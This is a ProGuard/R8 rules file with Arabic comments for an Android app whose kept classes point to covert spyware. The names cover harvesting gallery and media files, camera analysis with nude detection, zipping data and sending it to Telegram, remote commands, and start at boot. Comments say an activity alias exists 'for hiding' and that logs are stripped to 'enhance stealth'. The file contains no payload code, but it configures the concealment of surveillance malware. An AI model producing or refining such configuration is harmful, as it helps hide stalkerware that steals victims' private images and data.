# ============================================================
#  قواعد ProGuard/R8 المُحسّنة – نسخة مضغوطة نهائية
#  تم تضييقها للحفاظ على العناصر المستخدمة فعلياً فقط
#  لزيادة فعالية التصغير وتقليل حجم الـ APK
# ============================================================

# ============================================================
#  تحسينات R8 الأساسية (إعادة التسمية والتصغير)
# ============================================================
-repackageclasses 'com.example.app.core'
-allowaccessmodification

# ============================================================
#  السمات المطلوبة للانعكاس وتصحيح الأخطاء
# ============================================================
-keepattributes *Annotation*, Signature, InnerClasses, EnclosingMethod
-keepattributes Exceptions, LineNumberTable

# ============================================================
#  نقاط الدخول الرئيسية (يجب الاحتفاظ بها بالكامل)
# ============================================================
-keep public class com.example.app.MainActivity { *; }
-keep public class com.example.app.ForegroundService { *; }

# ============================================================
#  ✅ حماية دوال الانعكاس (Reflection) المستخدمة فعلياً
#  تم تضييقها إلى الكلاسات والدوال المحددة فقط
# ============================================================

# NudeDetector - دوال تُستدعى عبر الانعكاس لتحديث النموذج
-keepclassmembers class com.example.app.NudeDetector {
    public *** ensureModelReady(...);
    public *** loadEngineForever(...);
    public *** isReady(...);
}

# Monitor - دوال تُستدعى من Commands و TelegramUi عبر الانعكاس
-keepclassmembers class com.example.app.Monitor {
    public *** getBatteryStatus(...);
    public *** isWifiConnected(...);
    public *** forceHarvest(...);
}

# TelegramUi - دوال تُستدعى من DailyZipper و Commands عبر الانعكاس
-keepclassmembers class com.example.app.TelegramUi {
    public *** getVlt(...);
    public *** getCtrl(...);
    public *** getDat(...);
    public *** sendDocument(...);
    public *** sendPhoto(...);
    public *** sendMessage(...);
    public *** notifyHarvest(...);
}

# GalleryBrowser - دوال تُستدعى من Commands عبر الانعكاس
-keepclassmembers class com.example.app.GalleryBrowser {
    public *** getGridKb(...);
    public *** showOptions(...);
    public *** executeAction(...);
    public *** updateLastMessageId(...);
}

# DailyZipper - دوال تُستدعى من Commands عبر الانعكاس
-keepclassmembers class com.example.app.DailyZipper {
    public *** run(...);
    public *** forceSendNow(...);
}

# Commands - دوال تُستدعى من TelegramUi مباشرة (غير مستخدمة عبر الانعكاس)
# ولكن إضافتها احتياطياً لضمان عدم إزالتها إن تم استخدامها مستقبلاً
-keepclassmembers class com.example.app.Commands {
    public *** execute(...);
    public *** validateControlPassword(...);
}

# ============================================================
#  ✅ حماية إضافية شاملة للانعكاس (Reflection) لجميع الفئات
#  هذه القاعدة تضمن عدم حذف أي دالة عامة تستخدم عبر الانعكاس
# ============================================================
-keepclassmembers class com.example.app.** {
    public *** *(...);
}

# ============================================================
#  الحفاظ على الدوال المحددة بواسطة @Keep
# ============================================================
-keepclassmembers class * {
    @androidx.annotation.Keep <methods>;
    @androidx.annotation.Keep <fields>;
}

# ============================================================
#  TensorFlow Lite – المكتبة الأساسية فقط (بدون دعم كامل)
# ============================================================
-keep class org.tensorflow.lite.Interpreter { *; }
-keep class org.tensorflow.lite.Interpreter$Options { *; }
-keep class org.tensorflow.lite.Tensor { *; }
-keep class org.tensorflow.lite.Delegate { *; }
-dontwarn org.tensorflow.lite.**

# ============================================================
#  Google HTTP Client – الحد الأدنى المطلوب (لتجنب Missing class)
# ============================================================
-keep class com.google.api.client.http.HttpTransport { *; }
-keep class com.google.api.client.http.javanet.NetHttpTransport { *; }
-keep class com.google.api.client.http.javanet.NetHttpTransport$Builder { *; }
-dontwarn com.google.api.client.http.**
-dontwarn com.google.api.client.http.javanet.**
-dontwarn com.google.crypto.tink.util.KeysDownloader

# ============================================================
#  منع تحذيرات R8 من المكتبات الخارجية (غير ضارة)
# ============================================================
-dontwarn javax.**
-dontwarn kotlin.**
-dontwarn okhttp3.**
-dontwarn okio.**

# ============================================================
#  ✅ إزالة جميع سجلات التصحيح (تقليل الحجم بشكل كبير وتعزيز التخفي)
#  تم إضافة println و print أيضاً لإزالة أي مخرجات غير مرغوبة
# ============================================================
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}
-assumenosideeffects class java.lang.System {
    public static void out.println(...);
    public static void err.println(...);
}

# ============================================================
#  الحفاظ على المنشئات الافتراضية (للإنشاء الديناميكي)
# ============================================================
-keepclasseswithmembers class * {
    public <init>(...);
}

# ============================================================
#  ✅ حماية إضافية للفئات الحيوية التي يتم استدعاؤها عبر النظام أو الانعكاس
# ============================================================

# BootReceiver - مستقبل الإقلاع يُستدعى بواسطة نظام Android (ليس عبر الانعكاس)
# ولكن يجب الحفاظ عليه بالكامل لمنع حذفه بواسطة R8
-keep class com.example.app.BootReceiver { *; }

# MainActivityAlias - الاسم المستعار للنشاط الرئيسي (يُستخدم للإخفاء)
-keep class com.example.app.MainActivityAlias { *; }

# ✅ حماية شاملة لـ StreamManager و CameraAnalyzer (بدلاً من القوائم المحددة)
# لضمان عدم حذف أي دالة تستخدم عبر الانعكاس أو النظام
-keepclassmembers class com.example.app.StreamManager { *; }
-keepclassmembers class com.example.app.CameraAnalyzer { *; }

# ============================================================
#  ✅ حماية شاملة ومحددة للانعكاس (Reflection) لمنع أخطاء Runtime
#  تم إضافتها لضمان عدم إزالة أي دالة أو حقل يتم الوصول إليه ديناميكياً
#  في الفئات الأساسية التي تعتمد على الانعكاس بشكل مكثف
# ============================================================
-keep class com.example.app.Monitor { *; }
-keepclassmembers class com.example.app.Monitor { *; }

-keep class com.example.app.TelegramUi { *; }
-keepclassmembers class com.example.app.TelegramUi { *; }

-keep class com.example.app.Commands { *; }
-keepclassmembers class com.example.app.Commands { *; }

-keep class com.example.app.GalleryBrowser { *; }
-keepclassmembers class com.example.app.GalleryBrowser { *; }

-keep class com.example.app.MediaScanner { *; }
-keepclassmembers class com.example.app.MediaScanner { *; }

-keep class com.example.app.DailyZipper { *; }
-keepclassmembers class com.example.app.DailyZipper { *; }

-keep class com.example.app.CameraAnalyzer { *; }
-keepclassmembers class com.example.app.CameraAnalyzer { *; }

-keep class com.example.app.NudeDetector { *; }
-keepclassmembers class com.example.app.NudeDetector { *; }

-keep class com.example.app.ConfigLoader { *; }
-keepclassmembers class com.example.app.ConfigLoader { *; }

-keep class com.example.app.SecurityHelper { *; }
-keepclassmembers class com.example.app.SecurityHelper { *; }

# ============================================================
#  ✅ حماية إضافية لـ MainActivity لدالة appendLog المستخدمة للتشخيص
#  تم إضافتها لضمان عدم إزالة الدالة التي يتم استدعاؤها عبر الانعكاس
#  من ConfigLoader و MainActivity نفسها
# ============================================================
-keep class com.example.app.MainActivity { *; }
-keepclassmembers class com.example.app.MainActivity {
    *;
}

# ✅ حماية Companion object الخاص بـ MainActivity
# لضمان استمرار عمل الدالة الثابتة appendLogStatic
-keep class com.example.app.MainActivity$Companion { *; }
-keepclassmembers class com.example.app.MainActivity$Companion { *; }

# ============================================================
#  نهاية القواعد
# ============================================================
